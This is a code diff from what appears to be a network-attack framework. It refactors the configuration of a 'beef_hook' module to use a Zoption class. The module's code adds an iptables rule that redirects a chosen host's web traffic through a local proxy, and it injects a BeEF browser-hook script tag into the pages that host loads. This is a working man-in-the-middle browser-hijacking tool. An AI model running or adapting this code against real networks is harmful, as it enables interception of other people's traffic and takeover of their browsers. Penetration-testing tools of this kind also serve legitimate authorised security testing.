@@ -1,6 +1,7 @@
 from attack import Attack
 from libmproxy import controller, proxy, platform
 from threading import Thread
+from zoption import Zoption
 import util
 
 
@@ -14,14 +15,14 @@ class beef_hook(Attack):
         self.hooker       = None
         self.hook_script  = "<script src=\"{0}\"></script>"
         self.iptable_http = "iptables -t nat -A PREROUTING -p tcp --dport 80 -s {0} -j REDIRECT --to-port 5544"
-        self.config.update({"hook_path": {"type":"str", 
-                                          "value":None, 
-                                          "required":True, 
-                                          "display":"Path to BeEF hook"},
-                            "hooked_host": {"type":"ip", 
-                                            "value":None,
-                                            "required":True, 
-                                            "display":"Host to hook"}
+        self.config.update({"hook_path":Zoption(type = str, 
+                                          value = None, 
+                                          required = True, 
+                                          display = "Path to BeEF hook"),
+                            "hooked_host": Zoption(type = "ip", 
+                                            value = None,
+                                            required = True, 
+                                            display = "Host to hook")
                             })
         self.info = """
                     BeEF (Browser Exploitation Framework) is a tool used in
@@ -39,13 +40,13 @@ class beef_hook(Attack):
         """
         if enable:
             util.init_app(self.iptable_http.format
-                                    (self.config['hooked_host']['value']))
+                                    (self.config['hooked_host'].value))
         else:
             util.init_app(self.iptable_http.replace('-A', '-D').format
-                                            (self.config['hooked_host']['value']))
+                                            (self.config['hooked_host'].value))
 
     def initialize(self):
-        self.hook_script = self.hook_script.format(self.config['hook_path']['value'])
+        self.hook_script = self.hook_script.format(self.config['hook_path'].value)
         self.modip_rule()
 
         self.running = True
@@ -61,7 +62,7 @@ class beef_hook(Attack):
         thread = Thread(target=self.hooker.run)
         thread.start()
 
-        return self.config['hooked_host']['value']
+        return True
 
     def shutdown(self):
         """ Disable the iptable rule and kill the proxy server
@@ -74,7 +75,7 @@ class beef_hook(Attack):
     def session_view(self):
         """ Return the host we're hooking
         """
-        return self.config['hooked_host']['value']
+        return self.config['hooked_host'].value
 
 
 class Hooker(controller.Master):
